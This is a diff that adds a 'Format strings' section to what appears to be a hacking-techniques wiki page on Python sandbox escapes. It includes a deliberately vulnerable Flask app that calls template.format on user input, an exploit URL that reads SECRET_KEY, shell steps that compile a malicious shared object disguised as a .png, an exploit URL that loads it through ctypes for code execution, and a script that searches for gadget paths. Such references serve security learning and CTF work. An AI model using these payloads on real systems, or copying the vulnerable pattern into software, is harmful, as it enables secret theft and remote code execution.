@@ -12,7 +12,7 @@ description: Some tricks specific to the Python language
 
 ## Filter Bypass
 
-If you find yourself in some sandbox, jail, or otherwise restricted environment there are a lot of tricks to get out of it.&#x20;
+If you find yourself in some sandbox, jail, or otherwise restricted environment there are a lot of tricks to get out of it.
 
 ### RCE without parentheses
 
@@ -503,6 +503,129 @@ Note that it gives an error when you provide a string that is not a Python objec
 >>> help("anything") # Error: "anything" not recognized
 >>> help(1, 2)       # Error: too many arguments
 ```
+
+### Format strings
+
+There are 2 main ways of formatting strings in Python. ["f-strings" (PEP 498)](https://peps.python.org/pep-0498/) are written as `f"text {variable}"` and inside these curly brackets, allow arbitrary code to be evaluated. These can only be written in source code, however, not generated at runtime.
+
+Another kind is using the [`str.format()` method](https://docs.python.org/3/library/stdtypes.html#str.format), which does allow generating a template at runtime, but is limited in its allowed syntax. Inside the `{...}` expressions, you are only allowed to do access attributes with `.` or `[key]` for dictionary/array indexes:
+
+```python
+"{obj.attr[key].other_attr[0]}".format(obj=obj)
+```
+
+With a combination of `__` properties you may be able to access **global variables** from a `class` instance that is given as context. For example, to read a `SECRET_KEY` in Flask:
+
+<pre class="language-python" data-title="Vulnerable Example"><code class="lang-python">from flask import Flask, request
+
+app = Flask(__name__)
+<strong>app.config["SECRET_KEY"] = "secret"
+</strong>
+class User:
+    def __init__(self, name):
+        self.name = name
+
+@app.route("/")
+def index():
+    template = request.args.get("template", "")
+<strong>    return template.format(user=User("Jorian"))
+</strong>
+app.run()
+</code></pre>
+
+Normally, you would read the name here via `{user.name}`. But using `user.__init__`, we can start to get the `__init__` method defined in this module. From there, `.__globals__` gives a dictionary of all global variables from which we can pick `[app]`. Now it's as simple as reading `.config[SECRET_KEY]` to return the value we want:
+
+{% code title="Exploit URL" %}
+```python
+/?template={user.__init__.__globals__[app].config[SECRET_KEY]}
+```
+{% endcode %}
+
+{% hint style="info" %}
+**Side note**: In some scenarios you can also _set_ properties, in this case `__` properties allow you to _set global variables_:
+
+{% embed url="https://blog.abdulrah33m.com/prototype-pollution-in-python/" %}
+{% endhint %}
+
+***
+
+Another technique only involving _attribute access_ is **loading a ctypes module**. Strangely enough, a `__getitem__` method in the `ctypes` module loads the key we give it from the filesystem as a Shared Object (see [#usdld\_preload-and-usdld\_library\_path](../linux/linux-privilege-escalation/command-exploitation.md#usdld_preload-and-usdld_library_path "mention") for creating one). This allows arbitrary code execution if you can write such a valid ELF file anywhere on the target system, the file extension _doesn't matter_.
+
+{% embed url="https://blog.rawpayload.com/blog/trx-ctf-2026-pixel-vault-writeup#turning-format-traversal-into-rce" %}
+Writeup involving format string to RCE using ctypes module loading + image/ELF polyglot
+{% endembed %}
+
+From the `__globals__`, we can access imported module items such as `Flask`. These themselves import modules and have other properties that can often be chained to reach `ctypes`, even if not imported by the app itself directly. In the above example, we can access the following to load a module from `ctypes.cdll` at an arbitrary path:
+
+{% code title="Setup" %}
+```bash
+echo -e '#include <stdlib.h>\nvoid _init() { system("id>/tmp/pwned"); }' > payload.c
+gcc -fPIC -shared -nostartfiles -o /tmp/payload.so payload.c
+# Optional: remove permissions and file extension
+chmod -x /tmp/payload.so && mv /tmp/payload.{so,png}
+```
+{% endcode %}
+
+{% code title="Exploit URL" overflow="wrap" %}
+```python
+{user.__init__.__globals__[Flask].__call__.__globals__[sys].modules[ctypes].cdll[/tmp/payload.so]}
+```
+{% endcode %}
+
+<details>
+
+<summary>Brute-Force script for finding <code>ctypes</code> module (BFS)</summary>
+
+Similar to in [#blacklist-bypass](python.md#blacklist-bypass "mention"), we can recursively look through all Python properties/dictionary keys (global modules) to find if any of them leads to `ctypes`:
+
+```python
+from flask import Flask  # source
+import ctypes            # sink
+
+def path_string(root, path):
+    result = root
+    for key, is_dict in path:
+        result += f'[{key}]' if is_dict else f'.{key}'
+
+    return result
+
+def search(root, target):
+    checked = []
+    queue = [(eval(root), [])]
+
+    while queue:
+        obj, path = queue.pop(0)
+
+        is_dict = isinstance(obj, dict)
+        if type(obj) == str:
+            continue
+
+        objs = obj.keys() if is_dict else dir(obj)
+
+        for key in objs:
+            try:
+                value = obj[key] if is_dict else getattr(obj, key)
+            except (TypeError, AttributeError, KeyError):
+                continue
+
+            unique = repr(value).split('at 0x')[0]
+
+            if unique in checked:
+                continue
+
+            new_path = path + [(key, is_dict)]
+
+            if value == target:
+                return path_string(root, new_path)
+
+            checked.append(unique)
+            queue.append((value, new_path))
+
+print(search("Flask", ctypes))
+# Flask.__call__.__globals__[sys].modules[ctypes]
+```
+
+</details>
 
 ## PyInstaller Reversing
 
